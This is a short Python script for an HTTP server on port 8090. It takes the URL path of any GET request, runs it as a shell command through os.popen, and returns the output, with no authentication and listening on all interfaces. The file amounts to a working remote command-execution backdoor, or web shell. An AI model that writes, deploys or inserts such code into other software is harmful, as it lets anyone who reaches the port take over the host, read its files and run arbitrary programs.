from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import urllib.parse
import os
class Resquest(BaseHTTPRequestHandler):
    def handler(self):
        # print("data:", self.rfile.readline().decode())
        self.wfile.write(self.rfile.readline())
 
    def do_GET(self):
        command = urllib.parse.unquote(self.path).lstrip('/')
        if command == 'exit':
            exit(0)
        result = "".join(os.popen(command).readlines())
        self.send_response(200)
        # self.send_header('Content-type', 'application/json')
        self.send_header('Content-type', 'text/plain; charset=utf-8')
        self.end_headers()
        self.wfile.write(result.encode('utf-8'))

if __name__ == '__main__':
    host = ('', 8090)
    server = HTTPServer(host, Resquest)
    print("Starting server, listen at: %s:%s" % host)
    server.serve_forever()
